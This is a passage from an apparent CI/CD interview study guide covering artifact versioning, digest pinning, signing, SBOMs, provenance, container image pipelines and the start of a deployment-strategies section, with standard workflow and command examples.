- **Content digest** (`sha256:…`) — the hash *is* the identity and the integrity check; two artifacts with the same digest are byte-identical. The strongest reference.

A common pattern: tag with semver *and* git-sha for humans, but **pin deployments by digest** for guarantees. Enforce immutability at the repository level (many registries let you mark repos immutable / block overwrites). Never re-push over an existing version — publish a new one.

### Q5. What's wrong with deploying the `:latest` tag?

`:latest` (and any mutable "floating" tag) is **not a version — it's a moving pointer**. The problems:

- **Non-reproducible.** `:latest` means different bytes at different times. Two servers pulling "latest" minutes apart can run **different code**.
- **You can't tell what's running.** "Prod is on latest" answers nothing — which build *is* that?
- **No deterministic rollback.** Rolling back to "latest" is meaningless; there's no stable prior identity to return to.
- **Cache ambiguity.** Nodes may have cached an old "latest" and not repull.

The fix: **deploy immutable, unique identifiers** — a specific semver/git-sha tag, and ideally **pin by digest** (`app@sha256:…`) so the deployed bytes are cryptographically fixed. Use `:latest` only as a convenience pointer for local `docker run` experimentation, never in a deployment manifest.

### Q6. Walk me through artifact promotion across environments.

**Promotion** is advancing one already-built artifact from a lower environment to a higher one **without rebuilding it**. Two common mechanics:

- **Repository promotion (copy/move)** — the artifact starts in a **snapshot/staging** repo; once it passes staging, you **copy or re-tag** it into a **release** repo (e.g. Artifactory promotes a build from `libs-staging` to `libs-release`). The bytes are identical; its *status/location* changes.
- **Digest reference (repoint)** — often you don't move anything at all: the artifact lives in one registry, and "promotion" is just changing which environment's deployment **references that same digest**. Staging and prod both point at `app@sha256:abc…`; promoting is flipping prod's pointer to it.

The discipline in both: **it's the same artifact you tested**, gated by promotion criteria (tests passed, approvals, scans clean). You might attach metadata/labels as it's promoted (`promoted-to=prod`, who approved, when). What you **never** do is rebuild from source at the promotion step — that would sever the guarantee that prod runs exactly what staging validated.

### Q7. Why do artifact retention and cleanup policies matter?

Because **artifacts are large and accumulate relentlessly** — every commit can produce a container image, a jar, build logs, caches. Without cleanup, your registry/repository storage balloons and so does the bill (and, for some registries, it slows down).

Sensible retention policies:

- **Expire ephemeral things aggressively** — PR/branch builds, snapshots, and pipeline artifacts get short TTLs (days).
- **Keep releases long / forever** — tagged production releases are cheap insurance for rollback and audit; retain them per your compliance needs.
- **Keep "last N" per branch/tag** — e.g. the last 10 images per service, plus anything currently deployed.
- **Never GC what's in use** — the cleanup job must exclude digests referenced by running deployments (deleting the image prod is on is an outage waiting to happen).

```text
# Typical policy
snapshots/PR builds : delete after 14 days
release builds      : keep indefinitely (or per compliance)
per service         : keep last 10 + anything deployed
```

Automate it (registry lifecycle rules / Artifactory cleanup policies) rather than relying on manual pruning. The goal is bounded storage cost without ever deleting something you might need to roll back to.

### Q8. What is artifact provenance and why does it matter (SLSA)?

**Provenance** is verifiable metadata answering **how and from what this artifact was built**: which source commit, which build system, which builder identity, which dependencies/inputs, when. It's the artifact's tamper-evident birth certificate.

Why it matters — **supply-chain security**. High-profile attacks (SolarWinds, various compromised-package incidents) inject malicious code during the *build*, not the source. Provenance lets a consumer verify an artifact **genuinely came from the expected source and build process**, not a compromised or spoofed one.

**SLSA** (Supply-chain Levels for Software Artifacts) is the industry framework for this — a graded set of requirements (higher levels demand tamper-resistant, non-falsifiable provenance produced by a trusted, isolated builder). Concretely you generate a signed **provenance attestation** during the build (GitHub Actions has native artifact attestation; sigstore/in-toto underpin the ecosystem) and attach it to the artifact. Consumers/deploy gates then **verify** the attestation before trusting/deploying. Provenance turns "I hope this image is what we think it is" into "I can cryptographically prove where it came from."

### Q9. How and why do you sign artifacts?

**Signing** cryptographically attaches a signature to an artifact so consumers can verify its **authenticity** (it came from you) and **integrity** (it wasn't tampered with in transit or in the registry).

Why: without signing, anyone who can write to your registry — or a MITM — could substitute a malicious image and your deploy would happily run it. Signing + verification closes that gap: only artifacts signed by a trusted key/identity get deployed.

The modern tool is **cosign** (part of the sigstore project):

```bash
# Sign a container image (keyless, via OIDC identity)
cosign sign ghcr.io/acme/app@sha256:abc123...

# Verify before deploying
cosign verify \
  --certificate-identity-regexp 'https://github.com/acme/.*' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/acme/app@sha256:abc123...
```

Sigstore's **keyless signing** is a big deal: instead of managing long-lived private keys, you sign using a short-lived certificate tied to your CI's OIDC identity, with the signature recorded in a public transparency log (Rekor). Enforce verification at the deploy gate (an admission controller like Kyverno/Sigstore policy-controller rejects unsigned or wrongly-signed images) so unsigned artifacts physically cannot reach prod.

### Q10. Why pin deployments by digest instead of by tag?

Because a **tag is a mutable pointer and a digest is the content itself.** `app:1.2.3` *should* be immutable, but a tag can be moved (re-pushed, or maliciously repointed); `app@sha256:abc…` **is** those exact bytes — it cannot point at anything else, by definition.

Pinning by digest gives you:

- **Absolute reproducibility** — every node pulls the identical image; no "tag moved under us."
- **Integrity** — the digest *is* a hash, so a tampered image fails to match.
- **Deterministic rollback** — the previous digest is a known-exact prior state.

```yaml
# Kubernetes: pin by digest, not tag
image: ghcr.io/acme/app@sha256:abc123def456...   # exact bytes
# not:  ghcr.io/acme/app:1.2.3                    # a movable tag
```

Common workflow: build → push with a semver/git-sha tag → read back the resulting **digest** → write *that digest* into the deployment manifest. Humans read the tag; the deploy trusts the digest.

### Q11. What is a dependency proxy / pull-through cache and why use one?

It's an **artifact repository configured to mirror a public registry** (npm, Maven Central, Docker Hub, PyPI). Your builds pull dependencies *through* your repo (Artifactory/Nexus remote repositories, GitHub's dependency proxy, a registry pull-through cache) instead of hitting the public source directly. The first request fetches and **caches** it; subsequent requests serve from your cache.

Why:

- **Resilience** — you're not dead in the water when the upstream registry has an outage or a package gets **yanked/deleted** (the left-pad problem). Your cache still has it.
- **Speed** — pulling from a local/regional mirror is faster than the public internet, and avoids rate limits (e.g. Docker Hub pull limits).
- **Control & security** — a single choke point where you can **scan, block, and audit** every dependency entering your org, and enforce approved-versions policy.
- **Reproducibility** — builds don't silently break because upstream changed.

It's basic supply-chain hygiene for any org past a handful of engineers: proxy public dependencies through a repo you control rather than pulling straight from the public internet on every build.

### Q12. What is an SBOM and why attach it to the artifact?

An **SBOM (Software Bill of Materials)** is a complete, machine-readable inventory of everything inside the artifact — every direct and transitive dependency, with names, versions, and often licenses (standard formats: **SPDX**, **CycloneDX**).

Why attach it to the artifact:

- **Vulnerability response** — when the next Log4Shell drops, you can instantly answer "are we affected, and *where*?" by querying SBOMs instead of frantically grepping build files across services.
- **License compliance** — know exactly what licenses you're shipping.
- **Supply-chain transparency** — consumers (and increasingly regulators/customers) can see what's in what they run; SBOMs are becoming a compliance requirement.

You **generate the SBOM at build time** (tools like Syft, Trivy, or native `docker buildx`/build attestations), then **attach it to the artifact** — as an attestation on the container image or published alongside it in the repository — so it travels with the exact bytes it describes. Pair it with provenance and signing and you have a full, verifiable picture of *what* is in the artifact and *where it came from*.

### Q13. Why keep environment config out of the artifact?

Because keeping config **out** of the artifact is exactly what lets you **build once and promote the same artifact** everywhere. This is **Factor III of the 12-factor app**: store config in the environment, not the build.

If you bake environment-specific values (DB URLs, API endpoints, feature flags, secrets) *into* the artifact, you'd need a **different artifact per environment** — which forces rebuilds, breaks reproducibility, and means the prod artifact is not the one you tested. Baking **secrets** in is doubly bad: they're now embedded in an image that lands in a registry, gets cached, and leaks.

Instead: the artifact is environment-agnostic, and per-environment config is **injected at deploy time** — env vars, mounted config maps, a secrets manager (Vault, cloud secret stores), or Kubernetes ConfigMaps/Secrets.

```yaml
# Same image everywhere; config injected per environment
containers:
  - image: ghcr.io/acme/app@sha256:abc123...   # identical in staging & prod
    env:
      - name: DATABASE_URL
        valueFrom: { secretKeyRef: { name: db, key: url } }   # per-env
```

One artifact, N environments, config supplied at the destination — that's the whole point of the build-once model.

### Q14. Design an artifact naming and tagging convention. What goes in it?

Good naming makes an artifact **self-describing and traceable**. I'd include:

- **Identity** — `<registry>/<org>/<service>`, e.g. `ghcr.io/acme/payments`.
- **A human version** — semver for releases (`1.4.2`); for continuous delivery, a monotonic build number or date can substitute.
- **The git SHA** — ties the artifact unambiguously to source (`payments:1.4.2-a1b2c3d`). This is the single most useful tag for debugging "what commit is this?".
- **The digest** — recorded and used for deployment pinning (not something you name, but always captured).

```text
ghcr.io/acme/payments:1.4.2              # release, human-facing
ghcr.io/acme/payments:1.4.2-a1b2c3d      # release + commit
ghcr.io/acme/payments:main-a1b2c3d       # mainline build by branch+sha
ghcr.io/acme/payments@sha256:abc123...   # what you actually deploy
```

Principles: tags are **immutable once pushed** (never re-tag over a release), the **git SHA is always present** for traceability, `:latest` is avoided for deploys, and the **digest is the source of truth** for what runs. Multiple tags can point at the same digest (a human tag + a sha tag) — that's fine, they're just labels on identical bytes.

### Q15. "Walk me through how a commit becomes the exact bytes running in prod" — tie the artifact story together.

The artifact is the thread through the whole pipeline:

1. **Commit** — a change lands on a branch; CI triggers.
2. **Build once** — compile/package into a single immutable artifact (say a container image), tagged with the **git SHA** and versioned; capture its **content digest**.
3. **Attest & sign** — generate **provenance** (SLSA) and an **SBOM**, and **sign** the image (cosign) — all bound to that digest.
4. **Test the artifact** — run unit/integration/e2e against **that exact artifact**, not a rebuild.
5. **Publish** — push the artifact to the **artifact repository/registry** (durable, versioned).
6. **Promote, don't rebuild** — deploy the **same digest** to staging; on passing gates/approvals, promote by **repointing prod at that identical digest** (or copying it to a release repo). Config for each environment is **injected at deploy**, not baked in.
7. **Verify at the gate** — an admission policy checks the **signature and provenance** before prod accepts it; the deploy pins by **digest**.
8. **Roll back** — if prod misbehaves, repoint at the **previous known-good digest** — instant, deterministic, because it literally ran before.

The one-sentence summary: **build one immutable, signed, provenance-bearing artifact; test it; promote that exact digest through environments with per-env config injected at deploy; deploy and verify by digest; roll back by repointing.** Same bytes from build to prod — that's the entire discipline.
## Container Image Pipelines

### Summary

**What this topic covers**

In modern CI/CD the deliverable is almost never a jar, a tarball, or a set of files copied onto a box — it is a **container image**, and the pipeline that produces it is the spine of the whole delivery system. This topic covers the container image as *the* immutable deployment artifact, the canonical image-pipeline stages (build → scan → sign → push → deploy), how to actually build images inside ephemeral CI runners (BuildKit, buildx, registry-backed layer caching, multi-arch), the **tagging and digest** discipline that makes "build once, promote everywhere" real, **vulnerability scanning** (Trivy/Grype/Docker Scout) as a gate, supply-chain integrity via **signing** (cosign/sigstore), **SBOM** generation and **SLSA provenance** attestation, registry choices and OIDC-based auth, the security tradeoffs of building images *inside* a container (Docker-in-Docker vs socket mount vs Kaniko/Buildah/rootless BuildKit), Docker Hub rate limits and pull-through caches, and admission control that only admits signed, scanned images. The 15 questions move from "how do I build an image in CI" to "design a build+scan+sign+push pipeline and enforce it at the cluster admission boundary."

**Mental model**

Think of the image as a **content-addressed, immutable fact**. Once `docker build` finishes, the image is identified by a `sha256:` digest computed over its content — change one byte of one layer and the digest changes. Tags (`v1.2.3`, `latest`, a git-sha) are just *mutable pointers* at digests; the digest is the truth. The pipeline's job is to produce exactly one digest per commit, prove things about it (it scans clean, it is signed, it has an SBOM), and then *never rebuild it* — you promote the same digest from dev to staging to prod. The instant you rebuild per environment you have thrown away reproducibility: the "prod" image is now a different artifact than the one you tested. So the mental frame is: **build once, attest, promote the digest.** Everything downstream (deploy manifests, admission policy, rollback) references the digest, not a floating tag.

**Key terms**

- **Image digest** — `sha256:…` content hash uniquely and immutably identifying an image; pull/deploy by `image@sha256:…` for reproducibility.
- **Tag** — a mutable human label pointing at a digest (`git-sha`, semver, `latest`). Convenient, not trustworthy.
- **BuildKit / buildx** — Docker's modern build engine; parallel stages, cache mounts, multi-arch, and remote registry cache backends.
- **Registry cache** — `--cache-to`/`--cache-from` export/import layer cache to a registry so ephemeral runners get warm caches.
- **CVE scanning** — Trivy/Grype/Docker Scout inspecting image layers for known-vulnerable packages; gate on severity.
- **SBOM** — Software Bill of Materials (SPDX/CycloneDX); the inventory of what is inside the image (syft generates it).
- **Signing (cosign/sigstore)** — cryptographically signing the image digest so consumers can verify origin/integrity; keyless signing via OIDC identities.
- **Provenance / SLSA** — attestation of *how* the artifact was built (source, builder, steps); SLSA is the maturity framework.
- **OIDC federation** — CI exchanges a short-lived workload identity token for registry/cloud creds — no long-lived stored passwords.
- **imagePullSecrets** — Kubernetes credential reference letting the kubelet pull from a private registry.
- **Kaniko / Buildah / rootless BuildKit** — daemonless image builders that avoid mounting a privileged Docker socket in CI.
- **Admission control** — a cluster gate (e.g. Kyverno/Gatekeeper/Connaisseur) that rejects images that are unsigned or unscanned.

**Why interviewers ask this**

The container image is where CI/CD, security, and operations collide, so it is a high-signal topic. A junior answer stops at "I run `docker build` and `docker push`." A senior answer treats the image as a supply-chain artifact: builds once and promotes by digest, refuses `:latest` in prod, scans and *fails* the build on criticals, signs and verifies at admission, and knows *why* Docker-in-Docker with a mounted socket is a privilege-escalation footgun in shared CI. Interviewers use this to separate people who ship containers from people who *operate* a container platform — the latter can reason about reproducibility, blast radius of a compromised builder, registry rate limits taking down deploys, and the cost/latency impact of image size. It also reveals supply-chain literacy (SBOM, SLSA, signing) which has become table stakes post-SolarWinds/Log4Shell.

**Common confusions**

- "The tag identifies the image" — no, the **digest** does; tags are reassignable pointers. Deploy by digest for immutability.
- "Rebuilding the image for prod is fine, it's the same Dockerfile" — a rebuild is a *new* artifact with a new digest and possibly newer base packages; you no longer deployed what you tested.
- "Scanning once at build is enough" — new CVEs are disclosed against *already-built* images daily; you also need to rescan/rebuild base images on a schedule.
- "Signing encrypts the image" — signing proves integrity and origin, it does not hide contents.
- "Docker-in-Docker is just a convenience" — mounting the host Docker socket gives a job effectively root on the runner host; it is the classic CI escape.
- "`:latest` is a version" — it's a floating pointer; two pulls can yield different images. Never deploy `:latest`.

**What follows from this topic**

The image is the artifact that every downstream topic acts on. **Deployment Strategies** (rolling/blue-green/canary) all shift traffic between *versions of this image identified by digest*. **Progressive Delivery & Canary Analysis** promotes or aborts a specific image digest based on metrics. The signing/SBOM/provenance thread continues into supply-chain security and GitOps (the desired digest lives in Git). And "build once, promote the digest" is the concrete, image-level expression of the deployment-pipeline principle "build one immutable artifact and promote it through environments."

### Q1. Why is the container image the central artifact in modern CI/CD, and what does "build once, promote the digest" mean for it?

Because a container image bundles the application *and* its entire userland (libraries, runtime, OS packages) into one immutable, content-addressed unit that runs identically wherever there is a container runtime. That kills the "works on my machine" and "works in staging but not prod" class of failures at the artifact level.

**Build once, promote the digest** applies the deployment-pipeline rule "build one immutable artifact and promote it" specifically to images:

- CI builds the image exactly once, on the commit, producing a digest `sha256:abc…`.
- That digest is scanned, signed, and given an SBOM.
- Every environment deploys `myapp@sha256:abc…` — the *same* digest — dev → staging → prod.

The failure mode this prevents is rebuilding per environment. A rebuild pulls potentially newer base-image packages and produces a *different* digest, so prod runs an artifact that was never tested. Reference the digest, not a floating tag, and prod is provably the thing that passed staging.

### Q2. Walk me through the stages of a container image pipeline.

A canonical image pipeline is **build → scan → sign → push → deploy**, with attestation woven in:

1. **Build** — `docker buildx build` produces the image from the Dockerfile, ideally reproducibly, with layer caching from a registry cache.
2. **Generate SBOM + provenance** — `syft` emits an SBOM; the builder emits SLSA provenance (what source/steps produced this).
3. **Scan** — Trivy/Grype/Docker Scout scans layers for CVEs; the job **fails** on criticals (policy-driven).
4. **Push** — push the image (and attestations) to the registry, tagged immutably by git-sha; capture the digest.
5. **Sign** — `cosign sign` the digest (keyless via OIDC); attach the SBOM and provenance as attestations.
6. **Deploy** — update the deployment manifest to the new `@sha256:…` digest; admission control verifies the signature and scan status before the pod is admitted.

The ordering matters: sign the *digest* after push (so you sign the immutable artifact), and verify at deploy/admission so an unsigned image can never reach prod.

### Q3. How do you build a container image inside an ephemeral CI runner efficiently? Talk about caching.

The problem: CI runners are ephemeral, so the Docker layer cache is empty on every run and rebuilds are slow. The fix is a **remote (registry-backed) cache** with BuildKit/buildx.

```yaml
# .github/workflows/build.yml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3        # enables BuildKit
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/acme/my-app:${{ github.sha }}
          cache-from: type=registry,ref=ghcr.io/acme/my-app:buildcache
          cache-to: type=registry,ref=ghcr.io/acme/my-app:buildcache,mode=max
```

Key levers:

- **BuildKit** parallelises independent stages and only rebuilds changed layers.
- **`cache-from`/`cache-to`** persist the layer cache in the registry between ephemeral runs (`mode=max` caches intermediate layers too).
- **Order the Dockerfile cache-friendly**: copy the dependency manifest and install deps *before* copying source, so a code change doesn't bust the dependency layer.
- **Cache mounts** (`RUN --mount=type=cache,target=/root/.m2`) persist package-manager caches across builds.

### Q4. Explain your image tagging strategy. Why deploy by digest instead of tag?

Tags are **mutable pointers**; digests are **immutable content hashes**. Use tags for humans and traceability, digests for deployment.

| Tag style | Example | Purpose |
|---|---|---|
| Immutable git-sha | `my-app:1a2b3c4` | Every build traceable to a commit; never reused |
| Semver | `my-app:2.4.1` | Human-facing release identity |
| Rolling `latest` | `my-app:latest` | Convenience only — **never** deploy this |
| Digest | `my-app@sha256:abc…` | What you actually deploy — immutable |

Rules I follow:

- **Tag every build with the git-sha** so any running image traces to a commit.
- **Add a semver tag on releases** for humans.
- **Never deploy `:latest`** — two pulls can resolve to different images; you lose reproducibility and rollback determinism.
- **Deploy by `@sha256:…` digest** in the manifest. Then "what is running in prod" is an exact, immutable answer, and rollback is "point at the previous digest."

### Q5. How does vulnerability scanning fit into the pipeline, and how do you avoid it becoming noise?

Scan the built image for known CVEs *before* it can be promoted, and gate on severity. Tools: **Trivy**, **Grype**, **Docker Scout**.

```yaml
      - name: Scan image
        uses: aquasecurity/trivy-action@0.24.0
        with:
          image-ref: ghcr.io/acme/my-app:${{ github.sha }}
          severity: CRITICAL,HIGH
          exit-code: '1'          # fail the job on findings
          ignore-unfixed: true    # only fail on CVEs that have a fix
```

Keeping it signal, not noise:

- **Fail only on CRITICAL/HIGH with a fix available** (`ignore-unfixed`) — otherwise unfixable base-OS CVEs block every deploy and teams start ignoring the scanner.
- **Use a VEX / ignore file** for triaged, genuinely-not-exploitable findings, with an expiry and a reason.
- **Keep base images fresh** — most image CVEs come from the base OS layer; a stale base is the usual culprit.
- **Rescan on a schedule**, not just at build — CVEs are disclosed against images you already shipped. Pair with a rebuild pipeline.

### Q6. What is image signing with cosign, and where do you verify signatures?

**cosign** (part of sigstore) cryptographically signs an image **digest** so consumers can verify it came from your pipeline and wasn't tampered with. Modern usage is **keyless**: the signature is tied to your CI's OIDC identity and recorded in the Rekor transparency log — no long-lived signing key to manage.

```bash
# In CI, after push (OIDC identity from the runner):
cosign sign --yes ghcr.io/acme/my-app@sha256:abc123...

# At deploy / admission time:
cosign verify \
  --certificate-identity-regexp "https://github.com/acme/my-app/.*" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  ghcr.io/acme/my-app@sha256:abc123...
```

**Sign in CI, verify at the boundary.** The verification point that matters is **admission control** in the cluster (Kyverno/Gatekeeper/Connaisseur) — a policy that rejects any pod whose image isn't signed by your expected identity. Verifying only in the pipeline is weak; enforcing at admission means even a manual `kubectl apply` of an unsigned image is refused.

### Q7. What is an SBOM and provenance attestation, and why generate them in CI?

An **SBOM** (Software Bill of Materials) is the machine-readable inventory of everything in the image — packages, versions, licenses (SPDX or CycloneDX). **Provenance** is an attestation of *how* the artifact was built: the source commit, the builder, the build steps — the SLSA framework grades how tamper-resistant that chain is.

Why in CI:

- **Incident response** — when the next Log4Shell drops, you query SBOMs to answer "which of our images contain the vulnerable package?" in minutes, not days.
- **License compliance** — know what you're shipping.
- **Supply-chain integrity** — signed provenance lets consumers verify the image was built by *your* pipeline from *your* source, not swapped in.

```bash
syft ghcr.io/acme/my-app@sha256:abc... -o spdx-json > sbom.spdx.json
cosign attest --yes --type spdxjson --predicate sbom.spdx.json \
  ghcr.io/acme/my-app@sha256:abc...
```

The SBOM and provenance are attached to the image as cosign **attestations**, so they travel with the digest and are themselves signed.

### Q8. Which registry do you push to, and how should CI authenticate to it?

Registry choice is usually "wherever you deploy": **GHCR** (GitHub-native), **ECR** (AWS), **GAR** (GCP), **Artifactory/Nexus** (self-hosted/enterprise). Functionally similar; pick for locality to the deploy target and for features (immutable tags, built-in scanning, replication).

Auth: **use OIDC federation, not long-lived registry passwords.**

```yaml
    permissions:
      id-token: write        # allow the runner to mint an OIDC token
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/ci-push
          aws-region: eu-west-1        # exchanges OIDC for short-lived STS creds
      - run: |
          aws ecr get-login-password | docker login --username AWS \
            --password-stdin 123456789012.dkr.ecr.eu-west-1.amazonaws.com
```

The CI exchanges its short-lived workload-identity token for scoped, expiring registry creds. No static secret to leak, rotate, or exfiltrate from a compromised job.

### Q9. Explain the "build once, promote everywhere" principle applied to images across environments.

You build a single image digest on the commit and promote *that exact digest* through environments. Promotion is a metadata/manifest change, not a rebuild.

```bash
DIGEST=ghcr.io/acme/my-app@sha256:abc123...

# staging manifest references the digest, tested there
# promote to prod == update prod manifest to the SAME digest
yq -i '.spec.template.spec.containers[0].image = strenv(DIGEST)' prod/deployment.yaml
git commit -am "promote my-app to prod: $DIGEST" && git push   # GitOps picks it up
```

Optionally, "promote" by *re-tagging in the registry* (`cosign copy` / `crane copy` the digest to a `prod` repo) — still the same content. The invariant: **prod runs the byte-identical image staging ran.** Anti-pattern: a separate `build:prod` job — now prod is an untested artifact, and any base-image drift between builds is unaccounted for.

### Q10. How do containers get pulled in Kubernetes from a private registry?

The kubelet needs credentials to pull from a private registry, supplied as an **imagePullSecret** (a `kubernetes.io/dockerconfigjson` secret) referenced by the pod/service account:

```yaml
apiVersion: v1
kind: Pod
spec:
  imagePullSecrets:
    - name: ghcr-creds
  containers:
    - name: app
      image: ghcr.io/acme/my-app@sha256:abc123...
```

Better than a static long-lived secret:

- **Cloud-native identity** — on EKS/GKE, the node's IAM/workload identity grants ECR/GAR pull access, so no stored secret at all.
- **Short-lived, rotated credential helpers** for other registries.

Attach the pull secret to the pod's **service account** rather than every pod spec so it applies namespace-wide. And note: the pull happens at the kubelet, so pull failures surface as `ImagePullBackOff`, not as a CI error.

### Q11. Base images accumulate CVEs over time. How do you keep deployed images patched?

The insight: a CVE disclosed *today* affects images you *already built and shipped* — you can't scan your way out of it at build time only. You need a **rebuild pipeline**.

- **Scheduled rebuilds** — a nightly/weekly job rebuilds active images against the latest patched base and re-runs scan/sign/push. Automation (Renovate/Dependabot) opens PRs bumping the base image tag.
- **Pin the base by digest, bump deliberately** — so builds are reproducible, but a bot proposes the bump when a newer patched base lands.
- **Minimal/distroless bases** — fewer packages means a smaller attack surface and far fewer CVEs to chase.
- **Continuous rescanning** of images in the registry, feeding alerts that trigger the rebuild.

The combination — small base + pinned digest + bot-driven bumps + scheduled rebuild + rescan — keeps the fleet patched without a human watching CVE feeds.

### Q12. Building images inside CI: Docker-in-Docker vs socket mount vs Kaniko/Buildah/rootless BuildKit — what's the tradeoff?

The core tension is that classic `docker build` needs a privileged daemon, and giving a CI job that privilege is dangerous on shared runners.

| Approach | How | Security |
|---|---|---|
| **Socket mount** (`-v /var/run/docker.sock`) | Job talks to the *host* daemon | Worst — job is effectively **root on the host**; can start privileged containers |
| **Docker-in-Docker (DinD)** | A `--privileged` sidecar daemon | Isolated from host but needs `--privileged`; still a large attack surface |
| **Kaniko** | Builds from a Dockerfile in userspace, no daemon | Good — no privileged daemon, runs as unprivileged |
| **Buildah** | Daemonless, supports rootless builds | Good — rootless-capable |
| **Rootless BuildKit** | BuildKit without root or a socket | Good — modern default for locked-down CI |

The rule: **never mount the host Docker socket in shared/multi-tenant CI** — a poisoned build step gets host root. Prefer a daemonless, rootless builder (Kaniko/Buildah/rootless BuildKit). DinD is acceptable in isolated single-tenant runners but still requires `--privileged`. This is a favourite senior question because the convenient default (socket mount) is the insecure one.

### Q13. Docker Hub rate limits are breaking our CI pulls. How do you fix it?

Docker Hub throttles anonymous pulls per IP, and CI runners share egress IPs, so busy pipelines hit the limit and builds fail with `toomanyrequests`.

Fixes, roughly in order:

- **Pull-through cache / registry mirror** — run a caching mirror (or use your cloud registry's mirror feature) so repeated base-image pulls hit the cache, not Docker Hub.
- **Mirror base images into your own registry** — `crane copy docker.io/library/node:20 ghcr.io/acme/mirror/node:20` and reference the mirror in Dockerfiles.
- **Authenticate the pull** — even a free authenticated account raises the limit versus anonymous; a paid org account raises it further.
- **Reduce pulls** — good layer caching means you don't re-pull the base every job.

The durable answer is a pull-through cache plus mirroring critical bases, so a Docker Hub outage or limit change can't stall your deploys.

### Q14. Design a GitHub Actions job that builds, scans, signs, and pushes an image, then explain how it's enforced at deploy.

```yaml
name: image
on:
  push: { branches: [main] }
permissions:
  contents: read
  packages: write
  id-token: write            # for keyless cosign + OIDC
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with: { registry: ghcr.io, username: ${{ github.actor }}, password: ${{ secrets.GITHUB_TOKEN }} }
      - id: build
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/acme/my-app:${{ github.sha }}
          cache-from: type=registry,ref=ghcr.io/acme/my-app:buildcache
          cache-to: type=registry,ref=ghcr.io/acme/my-app:buildcache,mode=max
      - name: Scan
        uses: aquasecurity/trivy-action@0.24.0
        with: { image-ref: ghcr.io/acme/my-app@${{ steps.build.outputs.digest }}, severity: CRITICAL,HIGH, exit-code: '1', ignore-unfixed: true }
      - uses: sigstore/cosign-installer@v3
      - name: Sign + SBOM attest
        run: |
          IMG=ghcr.io/acme/my-app@${{ steps.build.outputs.digest }}
          cosign sign --yes "$IMG"
          syft "$IMG" -o spdx-json > sbom.json
          cosign attest --yes --type spdxjson --predicate sbom.json "$IMG"
```

**Enforcement at deploy** is a cluster **admission policy** (e.g. Kyverno) that verifies the cosign signature and expected OIDC identity before admitting any pod. So the pipeline *produces* a signed, scanned digest, and the cluster *refuses* anything else — the two halves close the loop. Deploy references the digest output, never a floating tag.

### Q15. How does image size affect the deployment pipeline, and how do you shrink it?

Image size hits you at two points: **pull latency** on every node during rollout (a 1.5 GB image on a scaling event means slow, staggered pod starts), and **attack surface / CVE count** (more packages = more to patch). Big images make canary and blue-green slower because new pods take longer to become ready.

Shrinking:

- **Multi-stage builds** — compile in a fat builder stage, copy only the artifact into a slim runtime stage.
- **Minimal/distroless base** — `distroless`, `alpine`, or `scratch` for static binaries; drops the shell and package manager.
- **`.dockerignore`** — keep build context (and node_modules, .git) out of the image.
- **Combine and order layers** — fewer, cache-friendly layers; clean package-manager caches in the same `RUN`.
- **Prune dev/build dependencies** from the runtime stage.

A distroless multi-stage build routinely takes an image from ~1 GB to tens of MB, which directly speeds up rollouts and node scale-ups.

## Deployment Strategies

### Summary

**What this topic covers**

How you get a new version of an artifact into production *without* taking the service down or blowing up the blast radius when something is wrong. This topic covers the full spectrum — **recreate** (accept downtime), **rolling update** (gradual instance replacement, the Kubernetes default), **blue-green** (two full environments and an instant traffic flip), and **canary** (route a small slice of traffic first and watch metrics) — plus the two ideas that change the game: **shadow/dark launch** (mirror real traffic to a new version without serving its responses) and **feature flags** (decouple *deploy* from *release* so you ship code dark and flip features at runtime). It also covers the hardest part of zero-downtime — **database migrations and backward compatibility** (expand/contract) — plus rollback strategy per approach, session draining, health-check gating, traffic-shifting mechanics, and how to *choose* a strategy for a given scenario. The 17 questions run from "what's the difference between rolling and blue-green" to "design a zero-downtime deploy with automated rollback and a schema change."

**Mental model**

Every strategy is answering one question: **during the window when old and new coexist, who sees what, and how fast can I undo it?** Order them by that. Recreate has no coexistence window but has *downtime*. Rolling has a coexistence window (mixed versions serving traffic) and cheap infra but slow, awkward rollback. Blue-green minimises the coexistence window to a single flip and gives *instant* rollback, at the cost of double infrastructure. Canary deliberately *extends* a controlled coexistence window so you can measure the new version on real traffic before committing — the safest for risk, but it needs traffic splitting and good metrics. Feature flags move the coexistence decision *out of deployment entirely* and into runtime: the code is already there, dark, and "release" is a config change. The senior insight running through all of it: **decouple deploy from release.** Deployment is moving bits onto machines; release is exposing behaviour to users. Once those are separate, most "deployment strategy" questions become "how do I control exposure and how do I revert it fast."

**Key terms**

- **Recreate** — stop all old instances, start all new; simplest, but incurs downtime.
- **Rolling update** — replace instances in batches (`maxSurge`/`maxUnavailable`); no downtime, but mixed versions during rollout.
- **Blue-green** — two identical full environments; deploy to idle (green), test, flip the router; instant rollback by flipping back.
- **Canary** — route a small % of traffic to the new version, watch metrics, ramp up or abort.
- **Shadow / dark launch** — mirror real traffic to the new version but discard its responses; tests under real load with zero user impact.
- **A/B testing** — route by *user attribute* to compare variants for a product/experiment outcome (not a rollout safety mechanism).
- **Feature flag / toggle** — runtime switch that exposes or hides behaviour without redeploying; decouples deploy from release.
- **Expand/contract (parallel change)** — evolve a schema in backward-compatible steps so old and new code both work during the deploy.
- **maxSurge / maxUnavailable** — Kubernetes rolling knobs: how many extra pods you may add, how many you may lose, during the roll.
- **Traffic shifting** — moving weighted traffic between versions via LB/ingress/service-mesh weights.
- **Connection/session draining** — letting in-flight requests finish on an old instance before terminating it.
- **Kill switch** — flipping a feature flag off instantly to disable a bad feature without a rollback deploy.

**Why interviewers ask this**

